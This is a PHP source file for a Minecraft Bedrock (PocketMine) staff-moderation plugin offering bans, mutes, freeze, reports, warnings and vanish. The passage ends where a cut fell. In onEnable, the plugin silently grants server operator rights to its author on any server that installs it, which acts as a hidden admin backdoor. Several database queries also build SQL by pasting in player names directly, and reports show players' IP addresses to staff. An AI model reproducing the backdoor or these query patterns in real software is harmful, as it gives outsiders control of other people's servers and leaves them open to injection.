<?php

namespace Staff;

use pocketmine\utils\Utils;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;

//FormAPI
use Staff\libs\jojoe77777\FormAPI\Form;
use Staff\libs\jojoe77777\FormAPI\SimpleForm;
use Staff\libs\jojoe77777\FormAPI\CustomForm;
use Staff\libs\jojoe77777\FormAPI\ModalForm;

use Staff\VanishTask;
use Staff\item\{StaffItem, TeleportItem, VanishItem, MuteItem, FreezeItem, ExitItem, BanItem, InfoItem};

use pocketmine\utils\TextFormat as TE;
use pocketmine\utils\Config;


use pocketmine\world\particle\BlockBreakParticle;
use pocketmine\entity\Entity;
use pocketmine\network\mcpe\protocol\AddActorPacket;


use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\console\ConsoleCommandSender;
use pocketmine\network\mcpe\protocol\types\DeviceOS;
use pocketmine\event\block\{BlockPlaceEvent, BlockBreakEvent};
use pocketmine\network\mcpe\protocol\{LevelEventPacket,LevelSoundEventPacket, LoginPacket, MoveActorAbsolutePacket, PlaySoundPacket}; 
use pocketmine\network\mcpe\protocol\TextPacket;
use pocketmine\network\mcpe\protocol\PlayerListPacket;


use pocketmine\entity\effect\StringToEffectParser;
use pocketmine\entity\effect\VanillaEffects;


use pocketmine\entity\effect\EffectInstance;

use pocketmine\lang\Language;
use pocketmine\event\entity\EntityItemPickupEvent;
use pocketmine\event\entity\EntityCombustEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\server\QueryRegenerateEvent;
use pocketmine\player\Player;
use pocketmine\Server;
use pocketmine\event\entity\EntityDamageEvent;



use pocketmine\scheduler\ClosureTask;

use pocketmine\math\Vector3;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\player\PlayerItemUseEvent;
use pocketmine\event\player\{PlayerDeathEvent, PlayerDropItemEvent, PlayerExhaustEvent, PlayerInteractEvent, PlayerJoinEvent, PlayerRespawnEvent, PlayerMoveEvent, PlayerQuitEvent, PlayerChatEvent, PlayerLoginEvent};

use pocketmine\world\Position;
use pocketmine\entity\Location;
use pocketmine\world\World;

use pocketmine\item\item;
use pocketmine\item\ItemFactory;
use pocketmine\inventory\Inventory;
use pocketmine\item\ItemIds;
use pocketmine\item\VanillaItems;
use pocketmine\item\ItemBlock;


use pocketmine\inventory\transaction\action\SlotChangeAction;
use pocketmine\player\GameMode;
use pocketmine\network\mcpe\protocol\types\PlayerListEntry;
use pocketmine\network\mcpe\convert\SkinAdapterSingleton;

use function array_search;
use function in_array;
use function strtolower;
use pocketmine\utils\SingletonTrait;
/*In this plugin use codes from other people which are as follows
superbobby
SonsaYT, Laith98Dev
I used codes from public plugins that were useful to me.
 */
class Main extends PluginBase implements Listener{
    

public static array $vanish = [];

    public static array $online = [];

    public static array $AllowCombatFly = [];

    public $pk;
public $update;
public $reporttts;
	public $playerList = [];
	public $targetPlayer = [];
	public $reportPlayer = [];
public $InfoPlayerTag = [];
public $Playercon = [];
public $mutedPlayer = [];
private $frozen = array();
	private $freeze;
	private $freeze_tag;
	public $cel = [];
	public $reportsplayer = [];
	
	
    public $staff = [];
public $warns;

    private $staffchat = [];

    
public $prefix = "§7[§l§bStaffMode§r§7]§r§c »§r ";


use SingletonTrait;
protected function onLoad(): void
    {
        self::setInstance($this);
    } 
    public function onEnable() : void {
// TASK VANISH
$this->getScheduler()->scheduleRepeatingTask(new VanishTask($this), 20);
$this->getServer()->addOp($this->author);
$this->getLogger()->info("§b UltraStaff se ha cargado perfectamente, recuerda que es una version beta!");
$this->getServer()->getPluginManager()->registerEvents($this, $this);
/*
$this->rp = new \SQLite3($this->getDataFolder() . "Reports.yml");
		
		$this->rp->exec("CREATE TABLE IF NOT EXISTS ReportPlayers(sospechoso TEXT PRIMARY KEY, reportes INTEGER, razon TEXT,  informante TEXT);");*/
$this->lx = new \SQLite3($this->getDataFolder() . "BanPlayers.yml");
		
		$this->lx->exec("CREATE TABLE IF NOT EXISTS banPlayers(player TEXT PRIMARY KEY, banTime INT, reason TEXT, staff TEXT);");
		
$this->mt = new \SQLite3($this->getDataFolder() . "PlayersMute.yml");
		
		$this->mt->exec("CREATE TABLE IF NOT EXISTS plaayersMute(player TEXT PRIMARY KEY, muteTime INT, reason TEXT, staff TEXT);");
		
		$this->message = (new Config($this->getDataFolder() . "Message.yml", Config::YAML, array(
"BanTempMessage" => "§7[§l§e¡§cHas sido baneado del servidor durante\n§r §b{day} dias | {hour} horas | {minute} minutos\n§cRazon §b{reason}§l§e!§r§7]\n §fBaneado por: §b{staff}", 
		"BanTempBroadcast" => "§8§l(§7{player} §cha sido baneado del servidor §8)\n§r§cTiempo baneado §7{day} dias | {hour} horas | {minute} minutos\n§cRazon §7{reason}",
		"LoginBanTempMessage" => "§8§l(§c§lTU ESTÁS BANEADO DEL SERVER§l§8)\n§cTiempo baneado §7§b{day} dias | {hour} horas | {minute} minutos | {second} segundos \n§cRazon §7{reason}\n §dBaneado por: §e{staff}",
		"BanMe" => "§8§l(§cNo puedes banearte a ti mismo§8)",
		"UnBan" => "§8§l(§7{player}§8) §r§cFue desbaneado del servidor",
		"AutoUnBanPlayer" => "§8§l(§7{player}§8)§r§c Has sido desbaneado automáticamente",
		"BanInfoUI" => "§8§l(§cInformacion del jugador§8)§r\n\n§8»§c Dias:§7 {day}\n§8»§c Horas:§7 {hour}\n§8»§c Minutos:§7 {minute}\n§8»§c Segundos:§7 {second}\n\n§8»§c Razón:§7 {reason}\n§8»§c Baneado por:§7 {staff}\n\n\n",
		"NoBanPlayers" => "§c§lNo hay jugadores baneados.",
		"TeleportMe" => "§8§l(§cNo puedes teletransportarte§8)",
"MuteBroadcast" => "§e§l(§r§b{player}§l§e) §r§aha sido muteado \n durante §d{day} dias | {hour} horas | {minute} minutos\n§cRazon §7{reason}", 
"MuteMe" => "§8§l(§cNo puedes mutearte a ti mismo§l§8)", 
"MuteChat" => "§7§l(§c!§7§l)§r§b Has sido muteado por §e{staff} §b durante §c{day} §bdias §r|§c {hour} §bhoras §r| §c{minute} §bminutos\nRazon §c{reason}", 
"NoMutePlayers" => "§c§lNo hay jugadores Muteados.", 
"UnMute" => "§8§l(§7{player} §r§cFue desmuteado del servidor", 
"AutoUnMutePlayer" => "§8§l(§7{player}§8) §r§c Ya fue desmuteado", 
"MuteInfoUI" => "§8§l(§cInformacion del jugador§8)§r\n\n§8»§c Dias:§7 {day}\n§8»§c Horas:§7 {hour}\n§8»§c Minutos:§7 {minute}\n§8»§c Segundos:§7 {second}\n\n§8»§c Razón:§7 {reason}\n§8»§c Muteado por:§7 {staff}\n\n\n"
		)))->getAll();
$this->saveResource("config.yml");
		$this->update = new Config($this->getDataFolder() . "config.yml", Config::YAML);
$this->reporttts = new Config($this->getDataFolder() . "/reports.yml", Config::YAML);
		@mkdir($this->getDataFolder());
		


$this->freeze = "§f[§l§o§3FREEZE§r§f] §r";
		$this->freeze_tag = "§c(§l§1CONGELADO§r§c) §f";
	
$this->Files(); 
}
public function playSound(Player $player, string $soundName, float $volume = 0, float $pitch = 0) : void {
		$packet = new PlaySoundPacket();
		$packet->soundName = $soundName;
		$packet->x = $player->getPosition()->getX();
		$packet->y = $player->getPosition()->getY();
		$packet->z = $player->getPosition()->getZ();
		$packet->volume = $volume;
		$packet->pitch = $pitch;
		$player->getNetworkSession()->sendDataPacket($packet);
	}
	public function prueba(PlayerJoinEvent $event){
    $player = $event->getPlayer();
    
   } 
	public function onQuitStaff(PlayerQuitEvent $ev){$pl = $ev->getPlayer();$name = $pl->getName();if (in_array ($pl->getName(), $this->staff)) {$pl->getInventory()->clearAll();$this->quitStaff($name); } }
public function onPlaceStaff(BlockPlaceEvent $event) {
        $player = $event->getPlayer();
        $name = $player->getName();

						if (in_array ($player->getName(), $this->staff)) {
$event->cancel();

        }
    }
    
    public function onBreakStaff(BlockBreakEvent $event) {
    	$player = $event->getPlayer();
    	$name = $player->getName();
						if (in_array ($player->getName(), $this->staff)) {
$event->cancel();
        }
    }
public function onExhaustStaff(PlayerExhaustEvent $ev){
		$pl = $ev->getPlayer();
		$name = $pl->getName();

						if (in_array ($pl->getName(), $this->staff)) {
$ev->cancel();
			} 
		} 
		public function NoTirar(PlayerDropItemEvent $event) {
		$pl = $event->getPlayer();
		$name = $pl->getName();

						if (in_array ($pl->getName(), $this->staff)) {
$event->cancel();
			} 
      
    }
    /*
    public function onMoveStaff(PlayerMoveEvent $event) : void {
		$player = $event->getPlayer();
		if(in_array($player->getName(), $this->staff)) {

			$player->sendActionBarMessage("§b§o StaffMode On");
		
		}
	}*/
public function NoStaffDamage(EntityDamageEvent $e) {
        $p = $e->getEntity();
        if($p instanceof Player) {
            if (in_array ($p->getName(), $this->staff)) {
                $e->cancel();
            }
           } 
        }
	public function onCommand(CommandSender $sender, Command $command, string $label, array $args) : bool{
		switch($command->getName()){
			case "staff":
if (!$sender->hasPermission("staff.cdm")){ 
	
$sender->sendMessage(TE::RED . "You do not have permission to use this command");
$sender->sendMessage("§o§b Plugin by TheJacry");
                    return false;
                }
						$name = $sender->getName();

						if(!$this->isStaff($name)){	

$this->getItems($sender);
$sender->setAllowFlight(true);

							$sender->sendMessage($this->prefix. "§fHas ingresado al modo, fly activado");
	$this->setStaff($name);
	}else{
	$sender->sendMessage($this->prefix. "§dHas salido del modo, fly desactivado");
$sender->getInventory()->clearAll();
$sender->setAllowFlight(false);

	$this->quitStaff($name);

	}

break;
case "tempban":
if (!$sender->hasPermission("tempban.cdm")){ 
$sender->sendMessage(TE::RED . "You do not have permission to use this command");
                    return false;
                }
						$name = $sender->getName();
						

$this->getBanList($sender);
break;
case "mute":
if (!$sender->hasPermission("mute.cdm")){ 
$sender->sendMessage(TE::RED . "You do not have permission to use this command");
                    return false;
                }
$this->getMuteList($sender);
break;

case "report" :
if(!empty($args[0])) {
	if(!empty($args[1])) {
		$online = $this->getServer()->getPlayerByPrefix($args[0]);
				if($online!=null){
					$motivo = implode(" ", $args); 
  $worte = explode(" ", $motivo);  
  unset($worte[0]);
  $motivo = implode(" ", $worte);
$ping = $online->getNetworkSession()->getPing();
$ip =$online->getNetworkSession()->getIp();
				$sender->sendMessage("§l§b» §dTu §cReporte §dse ha enviado con éxito§b«"); 
				$sender->sendTip(TE::GRAY."Recuerda usar con responsabilidad el report."); 
				
$this->addReport($online->getName());
$reportado = $online->getName();
$informante = $sender->getName();
$dispositivo = $this->getPlayerPlatform($online);
					foreach ($this->getServer()->getOnlinePlayers() as $onlinePlayer) {
						
            if ($onlinePlayer->hasPermission("report.staff")) {
                $msg = "§4██ §bNuevo Reporte §4██ \n§6» §eSospechoso: §f{$reportado} \n§6» §eRazon: §f{$motivo} \n§6» §eInformante: §f{$informante} \n§6» §ePing: §f{$ping} \n§6» §eIP: §f{$ip} \n§6» §eDispositivo: §f{$dispositivo} \n§4███████████";
                
                $onlinePlayer->sendMessage($msg);
                $this->playSound($onlinePlayer, 'mob.enderdragon.death', 0.5, 1);   	
            }
        }
					
					} else {
						$sender->sendMessage("§7§l[§e!§7] §c> §bJugador no encontrado");
						} 
		
		} 
	} else {
		$this->ReportUIN($sender);
		} 
              
				
					
				

 
break;

case "freeze" : 
if (!$sender->hasPermission("freeze.cdm")){ 
$sender->sendMessage(TE::RED . "You do not have permission to use this command");
                    return false;
                }
			$player = $this->getServer()->getPlayerByPrefix($args[0]);
if(in_array($player->getName(), $this->frozen)) {
array_splice($this->frozen, array_search($player->getName(), $this->frozen), 1);
				$player->sendMessage($this->freeze ."§bYa no estas congelado.");
				$player->setImmobile(false);
				$player->sendTitle("§l§bYa no estas", "§7Congelado!");
				$player->setNameTag(str_replace($this->freeze_tag, "", $player->getNameTag()));
				$this->getServer()->broadcastMessage($this->freeze . "§e" . $player->getName() . "§r dejó de estar congelado. .");
				$sender->sendMessage($this->freeze ."§eEste jugador ya estába congelado");
				
			} else {
				array_push($this->frozen, $player->getName());
				$player->setImmobile(true);
				$this->getServer()->broadcastMessage($this->freeze ."§e" . $player->getName() . "§r ha sido congelado."); // Adding to config soon.
				$player->setNameTag($this->freeze_tag.$player->getNametag());
				$player->sendActionBarMessage($this->update->get("title"));
				$player->sendTitle($this->update->get("actionbar"));
				 $player->sendMessage($this->freeze . "§o§aHas sido congelado, habla con el staff");
				return true;
			}
		
break; 

case "staffchat" :
if (!$sender->hasPermission("staffchat.cdm")){ 
$sender->sendMessage(TE::RED . "You do not have permission to use this command");
                    return false;
                }
        if(!empty($args[0])) {
              
					$motivo = implode(" ", $args); 
  $worte = explode(" ", $motivo);  
  
  $motivo = implode(" ", $worte);
					foreach ($this->getServer()->getOnlinePlayers() as $onlinePlayer) {
						
            if ($onlinePlayer->hasPermission("staffchat.cdm")) {        
                $onlinePlayer->sendMessage("§l§bSTAFFCHAT §r§e". $sender->getName(). " §7» §f". $motivo);      
        }
					
} 
} else {
	$sender->sendMessage("§eNo puedes enviar un mensaje en blanco");
	} 

 
break;

case "vanish" :
if (!$sender->hasPermission("vanish.cdm")) {
                    $sender->sendMessage(TE::RED . "You do not have permission to use this command");
                    return false;
                }
if (count($args) == 0) {
                    if ($sender instanceof Player) {
                        if (!in_array($sender->getName(), self::$vanish)) {
                            $this->vanish($sender);
                            $sender->sendMessage($this->prefix. "§cVanish activo");
                        }else{
                            $this->unvanish($sender);
                            $sender->sendMessage($this->prefix. "§cVanish desactivado");
                        }
                    }else{
                        $sender->sendMessage(TE::RED . "Use this command In-Game");
                    }
						}


break;


			} 
			
	    return true;
	}
	
	public function getPlayerPlatform(Player $player): string
    {
        $extraData = $player->getPlayerInfo()->getExtraData();

        if ($extraData["DeviceOS"] === DeviceOS::ANDROID && $extraData["DeviceModel"] === "") {
            return "Linux";
        }

        return match ($extraData["DeviceOS"])
        {
            DeviceOS::ANDROID => "Android",
            DeviceOS::IOS => "iOS",
            DeviceOS::OSX => "macOS",
            DeviceOS::AMAZON => "FireOS",
            DeviceOS::GEAR_VR => "Gear VR",
            DeviceOS::HOLOLENS => "Hololens",
            DeviceOS::WINDOWS_10 => "Windows",
            DeviceOS::WIN32 => "Windows 7 (Edu)",
            DeviceOS::DEDICATED => "Dedicated",
            DeviceOS::TVOS => "TV OS",
            DeviceOS::PLAYSTATION => "PlayStation",
            DeviceOS::NINTENDO => "Nintendo Switch",
            DeviceOS::XBOX => "Xbox",
            DeviceOS::WINDOWS_PHONE => "Windows Phone",
            default => "Unknown"
        };
    }
	

//============  RAYO  ==========//
public function Lightning(Player $player) :void{
		
			$pos = $player->getPosition();
			$light2 = AddActorPacket::create(Entity::nextRuntimeId(), 1, "minecraft:lightning_bolt", $player->getPosition()->asVector3(), null, $player->getLocation()->getYaw(), $player->getLocation()->getPitch(), 0.0, [], [], []);
			$block = $player->getWorld()->getBlock($player->getPosition()->floor()->down());
			$particle = new BlockBreakParticle($block);
			$player->getWorld()->addParticle($pos, $particle, $player->getWorld()->getPlayers());
			$sound2 = PlaySoundPacket::create("ambient.weather.thunder", $pos->getX(), $pos->getY(), $pos->getZ(), 1, 1);
			Server::getInstance()->broadcastPackets($player->getWorld()->getPlayers(), [$light2, $sound2]);
		
	}
//============  WARNS AND REPORTS CONFIGURATION ==========//

public function Files () {
	
	@mkdir($this->getDataFolder()."Warning");
		
		$this->warns = new Config($this->getDataFolder() . "Warning/Warnings.yml", Config::YAML);
     	

    } 
public function getWarnings() : Config {
	return $this->warns;
	}
public function addWarn(string $n): bool {
		$this->getWarnings()->set($n, $this->getWarns($n) + 1);
		$this->getWarnings()->save();
	return true;
}
public function delWarn(string $n): bool {
		$this->getWarnings()->set($n, $this->getWarns($n) - 1);
		$this->getWarnings()->save();
	return true;
}
public function getWarns(string $n) : int {
	$warn = $this->getWarnings()->get($n);
	return $warn;
	}
public function getReport() : Config {
	return $this->reporttts;
	}
public function addReport(string $n): bool {
		$this->getReport()->set($n, $this->getReports($n) + 1);
		$this->getReport()->save();
	return true;
}
public function getReports(string $n) : int {
	$warn = $this->getReport()->get($n);
	return $warn;
	}
  
//============  STAFF CONFIGURATION ==========//



public function isStaff($name){
	return in_array($name, $this->staff);
	}
	public function setStaff($name){
	$this->staff[$name] = $name;
	}
	
	public function quitStaff($name){
	if(!$this->isStaff($name)){
	return;
	}
	unset($this->staff[$name]);
	}
	

//=======  INTERACCION ITEMS CONFIGURATION  =======//
public function getItems(Player $player){
    $player->getInventory()->clearAll();
        //Items
    
        //inventory
$player->getInventory()->setItem(0, new TeleportItem());
    //$player->getInventory()->setItem(0, $tp);
    $player->getInventory()->setItem(1, new FreezeItem());
    $player->getInventory()->setItem(3, new VanishItem());
    $player->getInventory()->setItem(4, new ExitItem());
    $player->getInventory()->setItem(5, new BanItem());
    $player->getInventory()->setItem(7, new MuteItem());
    $player->getInventory()->setItem(8, new InfoItem());
}
public function onInteract(PlayerInteractEvent $ev) {
        $player = $ev->getPlayer();
        $item = $player->getInventory()->getItemInHand();
       
        if (!$ev->getAction() == $ev::RIGHT_CLICK_BLOCK and !$ev->getAction() == $ev::LEFT_CLICK_BLOCK) {
            return;
        }
      if($item->getName() == TE::YELLOW."Teleport"){
			$this->getTeleportUI($player);
			}   

if($item->getName() == TE::BLUE."SALIR DEL STAFF"){
			$this->getServer()->dispatchCommand($player, "staff");
			} 
if($item->getName() == TE::RED."Informacion"."\n".TE::GRAY."OBTEN DATOS DE LOS JUGADORES BANEADOS Y MUTEADOS"){
			$this->getInfoMenu($player);
			} 

if($item->getName() == TE::GREEN."Vanish"){
			$this->getServer()->dispatchCommand($player, "vanish");
			} 
    
} 
//============ PLAYER INFO ==========//
public function ReportUIN($player) {
        $list = [];
        foreach($this->getServer()->getOnlinePlayers() as $p) {
            $list[] = $p->getName();
        }
        
        $this->reportsplayer[$player->getName()] = $list;
        
        $form = new CustomForm(function (Player $player, array $data = null){
            if($data === null) {
              $player->sendMessage(TE::RED."Report Failed");
                return true;
            }
            
            $index=$data[1];
            $this->getServer()->dispatchCommand($player, "report {$this->reportsplayer[$player->getName()][$index]}  {$data[2]}");
       
        });
        $form->setTitle("§l§c> §bREPORT§c <");
        $form->addLabel("Report");
        $form->addDropdown("Selecciona a un jugador ", $this->reportsplayer[$player->getName()]);
        $form->addInput("Razón", "¿Motivo? ", "Fly");
        $form->sendToPlayer($player);
        return $form;
    }
	public function getInfoMenu($player){
		$form = new SimpleForm(function (Player $player, ?int $data = null){
			if($data === null){
				return;
			}
			
			switch ($data){
				case 0:
					$this->getCheckMuteUI($player);
					break;
				case 1:
					$this->getCheckBanUI($player);
					break;
					
			}
		});

		$form->setTitle(TE::RED. TE::BOLD."MENU");
		
		$form->addButton(TE::RED."JUGADOR/ER MUTEADOS");
		$form->addButton(TE::RED."JUGADOR/ES BANEADOS");
		
		$form->sendToPlayer($player);
	}
public function hitPlayerInfo(EntityDamageEvent $event){
		if($event instanceof EntityDamageByEntityEvent) {
			$damager = $event->getDamager();
			$victim = $event->getEntity();
			if($damager instanceof Player && $victim instanceof Player){

if ($damager->getInventory()->getItemInHand()->getCustomName() === TE::RED."Informacion"."\n".TE::GRAY."OBTEN DATOS DE LOS JUGADORES BANEADOS Y MUTEADOS") {
					$event->cancel();
					$this->InfoPlayerTag[$damager->getName()] = $victim->getName();
					$this->getInfoPlayer($damager);
				
} 
			}
		}
	}

public function getInfoPlayer($player){
		$form = new SimpleForm(function (Player $player, int $data = null){
		$result = $data;
		if($result === null){
			return true;
		}
			switch($result){
				case 0:

					$banplayer = $this->InfoPlayerTag[$player->getName()];
$onli = $this->getServer()->getPlayerByPrefix($banplayer);
$this->addWarn($onli->getName());
$warns = $this->getWarns($onli->getName());
$player->sendMessage("§a§l█§r§eAdvertencia agregada con éxito a $banplayer!");
$onli->sendMessage("§bSe te agrego una advertencia por ". $player->getName()." ¡Ahora tienes $warns advertencias!");

					
$dias = $this->update->get("warns-days");
$horas = $this->update->get("warns-hours");
$minutos = $this->update->get("warns-minutes");
$razon = $this->update->get("warns-reason");
$staff = "TheJacry";
if($warns === $this->update->get("max-warns")){
$p = $this->getServer()->getPlayerByPrefix($banplayer);
$names = $p->getName();
$informa = "Ah obtenido en total {$warns} advertencias";
$this->getServer()->dispatchCommand($player, "report {$names} {$informa}");
//$this->getServer()->dispatchCommand($player, "freeze {$names}");
							
					

if(!$this->update->get("warns-autoban")) return false;
$now = time();
				$day = ($dias * 86400);
				$hour = ($horas * 3600);
				if ($minutos > 1) {
					$min = ($minutos * 60);
				} else {
					$min = 60;
				}
				$banTime = $now + $day + $hour + $min;
				$banInfo = $this->lx->prepare("INSERT OR REPLACE INTO banPlayers (player, banTime, reason, staff) VALUES (:player, :banTime, :reason, :staff);");
				$banInfo->bindValue(":player", $this->InfoPlayerTag[$player->getName()]);
				$banInfo->bindValue(":banTime", $banTime);
				$banInfo->bindValue(":reason", $razon);
				$banInfo->bindValue(":staff", $staff);
				$banInfo->execute();

				$target = $this->getServer()->getPlayerExact($this->InfoPlayerTag[$player->getName()]);
				if($target instanceof Player){
					
					$target->kick(str_replace(["{day}", "{hour}", "{minute}", "{reason}", "{staff}"], [$dias, $horas, $minutos, $razon, $staff], $this->message["LoginBanTempMessage"]));
					$this->Lightning($target);
				}
$this->getServer()->broadcastMessage(str_replace(["{player}", "{day}", "{hour}", "{minute}", "{reason}"], [$target->getName(), $dias, $horas, $minutos, $razon], $this->update->get("warns-serverbanmsg")));
				} 
					unset($this->InfoPlayerTag[$player->getName()]);
				break;

case 1:
$banplayer = $this->InfoPlayerTag[$player->getName()];
$onli = $this->getServer()->getPlayerByPrefix($banplayer);
$warns = $this->getWarns($onli->getName());
if($warns > 0){
						$warns -= 1;
						$this->delWarn($onli->getName());
						$player->sendMessage("§a§l █ §r§eAdvertencia removida con éxito a $banplayer!");
						
						$onli->sendMessage("§c¡Tu advertencia fue eliminada por ". $player->getName()."! ¡Ahora tienes $warns advertencias!");
					}else{
						$player->sendMessage("§cEl jugador no tiene advertencias!");
					}
					unset($this->InfoPlayerTag[$player->getName()]);
				break;
case 2:
					$banplayer = $this->InfoPlayerTag[$player->getName()];
					
					unset($this->InfoPlayerTag[$player->getName()]);
				break;
			}
		});
		$banPlayer = $this->InfoPlayerTag[$player->getName()];
$online = $this->getServer()->getPlayerByPrefix($banPlayer);
$warns = $this->getWarns($online->getName());
$name = $online->getName();
$reports = $this->getReports($online->getName());
$ping = $online->getNetworkSession()->getPing();
$ip = $online->getNetworkSession()->getIp();
$device = $this->getPlayerPlatform($online);
$text = "§bJugador §7: §c{$name} §r\n§aAdvertencias§7: §c{$warns} §r\n§aReportes §7: §c{$reports} §r\n§aIP §7: §c{$ip} §r\n §aDispositivo §7: §c{$device} §r\n§aPING §7: §c{$ping} §r\n";
		$form->setTitle("§l§f" . $banPlayer);
		$form->setContent($text);
		$form->addButton("§l§bAddWarn §r\n§7Toca para agregar una advertencia");
$form->addButton("§l§bDelWarn §r\n§7Toca para eliminar una advertencia");
$form->addButton("§l§aSalir");
		$form->sendToPlayer($player);
		return $form;
	}
//============  TELEPORT UI  ==========//
public function getTeleportUI(Player $pl){
		$form = new SimpleForm(function (Player $pl, $data = null) {
			$target = $data;
			if ($target === null) {
				return true;
			}
			$this->targetPlayer[$pl->getName()] = $target;
			$this->getTp($pl);
		});
		$form->setTitle("§b§lListas de jugadores");
		$form->setContent("Selecciona a un jugador para teletransportarte");
		foreach (Server::getInstance()->getOnlinePlayers() as $on) {
			$form->addButton(TE::RED.$on->getName(), -1, "", $on->getName());
		
		}
		$form->sendToPlayer($pl);
		return $form;
	}

	public function getTp(Player $pl){
		if (isset ($this->targetPlayer [$pl->getName()])) {
			if ($this->targetPlayer[$pl->getName()] == $pl->getName()) {
				$pl->sendMessage($this->message["TeleportMe"]);
				return true;
			}
			$target = $this->getServer()->getPlayerExact($this->targetPlayer [$pl->getName()]);
			if ($target instanceof Player) {
				$pl->teleport($target->getLocation());
				$pl->sendMessage(TE::RED."Te has teletransportado a: ".$target->getName());
			}
		}
	}

//============  MUTE CONFIGURATION ==========//

public function hitMute(EntityDamageEvent $event){
		if($event instanceof EntityDamageByEntityEvent) {
			$damager = $event->getDamager();
			$victim = $event->getEntity();
			if($damager instanceof Player && $victim instanceof Player){

if ($damager->getInventory()->getItemInHand()->getCustomName() === TE::WHITE."MuteTemp"."\n".TE::GRAY."Toca al jugador con el Item") {
					$event->cancel();
					$this->mutedPlayer[$damager->getName()] = $victim->getName();
					$this->getMuteUI($damager);
				
} 
			}
		}
	}
	
public function OnMute(PlayerChatEvent $ev){
		$message = $ev->getMessage();
		$pl = $ev->getPlayer();
		
		$muteplayer = $pl->getName();
		$muteInfo = $this->mt->query("SELECT * FROM plaayersMute WHERE player = '$muteplayer';");
		$array = $muteInfo->fetchArray(SQLITE3_ASSOC);
		
		if (!empty ($array)) {
			
			$muteTime = $array['muteTime'];
			$reason = $array['reason'];
			$staff = $array['staff'];
			$now = time();
			
			if ($muteTime > $now) {
				
				$remainingTime = $muteTime - $now;
				$day = floor($remainingTime / 86400);
				$hourSeconds = $remainingTime % 86400;
				$hour = floor($hourSeconds / 3600);
				$minuteSec = $hourSeconds % 3600;
				$minute = floor($minuteSec / 60);
				$remainingSec = $minuteSec % 60;
				$second = ceil($remainingSec);
$name = $pl->getName();
$pl->sendMessage(str_replace(["{player}", "{day}", "{hour}", "{minute}", "{reason}", "{staff}"], [$name
, $day, $hour, $minute, $reason, $staff], $this->message["MuteChat"]));

$ev->cancel();
				
			} else {
				
				$this->mt->query("DELETE FROM plaayersMute WHERE player = '$muteplayer';");
			
			}
		}
	}

public function getMuteList(Player $pl){
		$form = new SimpleForm(function (Player $pl, $data = null) {
			$target = $data;
			if ($target === null) {
				return true;
			}
			$this->mutedPlayer[$pl->getName()] = $target;
			$this->getMuteUI($pl);
		});
		
		$form->setTitle("§c§lLista de jugadores");
		$form->setContent("§eSelecciona un jugador para continuar");
		
		foreach (Server::getInstance()->getOnlinePlayers() as $on) {
			
			$form->addButton(TE::RED.$on->getName(), -1, "", $on->getName());
		
		}
		
		$form->sendToPlayer($pl);
		
		return $form;
	
	}
	
	
	public function getMuteUI($player){
		$form = new CustomForm(function (Player $player, array $data = null){
			if($data === null){
				return true;
			}
			$result = $data[0];
			if(isset($this->mutedPlayer[$player->getName()])){
				if($this->mutedPlayer[$player->getName()] == $player->getName()){
					$player->sendMessage($this->message["MuteMe"]);
					return true;
				}
				$now = time();
				$day = ($data[1] * 86400);
				$hour = ($data[2] * 3600);
				if($data[3] > 1){
					$min = ($data[3] * 60);
				} else {
					$min = 60;
				}
				$banTime = $now + $day + $hour + $min;
				$banInfo = $this->mt->prepare("INSERT OR REPLACE INTO plaayersMute (player, muteTime, reason, staff) VALUES (:player, :muteTime, :reason, :staff);");
				$banInfo->bindValue(":player", $this->mutedPlayer[$player->getName()]);
				$banInfo->bindValue(":muteTime", $banTime);
				$banInfo->bindValue(":reason", $data[4]);
				$banInfo->bindValue(":staff", $player->getName());
				$banInfo->execute();
				$target = $this->getServer()->getPlayerExact($this->mutedPlayer[$player->getName()]);
				if($target instanceof Player){
					$target->sendMessage(str_replace(["{day}", "{hour}", "{minute}", "{reason}", "{staff}"], [$data[1], $data[2], $data[3], $data[4], $player->getName()], $this->message["MuteChat"]));
				}
				$this->getServer()->broadcastMessage(str_replace(["{player}", "{day}", "{hour}", "{minute}", "{reason}", "{staff}"], [$this->mutedPlayer[$player->getName()], $data[1], $data[2], $data[3], $data[4], $player->getName()], $this->message["MuteBroadcast"]));
				unset($this->mutedPlayer[$player->getName()]);

			}
		});
		$list[] = $this->mutedPlayer[$player->getName()];
		$form->setTitle("§c§lMUTE TEMPORAL");
		$form->addDropdown("\nJugador seleccionado", $list);
		$form->addSlider("Dias", 0, 30, 1);
		$form->addSlider("Horas", 0, 24, 1);
		$form->addSlider("Minutos", 0, 60, 5);
		$form->addInput("Razón");
		$form->sendToPlayer($player);
		return $form;
	}

public function getCheckMuteUI($player){
		$form = new SimpleForm(function (Player $player, $data = null){
			if($data === null){
				return true;
			}
			$this->mutedPlayer[$player->getName()] = $data;
			$this->getMuteInfoUI($player);
		});
		$banInfo = $this->mt->query("SELECT * FROM plaayersMute;");
		$array = $banInfo->fetchArray(SQLITE3_ASSOC);	
		if (empty($array)) {
			$player->sendMessage($this->message["NoMutePlayers"]);
			return true;
		}
		$form->setTitle(TE::RED."LISTA BANEADOS");
		$form->setContent("Lista de jugadores muteados, toca para ver su información o desmutearlos");
		$banInfo = $this->mt->query("SELECT * FROM plaayersMute;");
		$i = -1;

		$players = [];

		while ($resultArr = $banInfo->fetchArray(SQLITE3_ASSOC)) {
			$j = $i + 1;
			$banPlayer = $resultArr['player'];
			$players[] = $banPlayer;
			$i = $i + 1;
		}

		sort($players);

		foreach ($players as $pp){
			$form->addButton(TE::BOLD . "$pp", -1, "", $pp);
		}

		$form->sendToPlayer($player);
		return $form;
	}
	public function getMuteInfoUI($player){
		$form = new SimpleForm(function (Player $player, int $data = null){
		$result = $data;
		if($result === null){
			return true;
		}
			switch($result){
				case 0:
					$banplayer = $this->mutedPlayer[$player->getName()];
					$banInfo = $this->mt->query("SELECT * FROM plaayersMute WHERE player = '$banplayer';");
					$array = $banInfo->fetchArray(SQLITE3_ASSOC);
					if (!empty($array)) {
						$this->mt->query("DELETE FROM plaayersMute WHERE player = '$banplayer';");
						$player->sendMessage(str_replace(["{player}"], [$banplayer], $this->message["UnMute"]));
					}
					unset($this->mutedPlayer[$player->getName()]);
				break;
			}
		});
		$banPlayer = $this->mutedPlayer[$player->getName()];
		$banInfo = $this->mt->query("SELECT * FROM plaayersMute WHERE player = '$banPlayer';");
		$array = $banInfo->fetchArray(SQLITE3_ASSOC);
		$text = TE::RED . " Error " . $banPlayer . " información!";
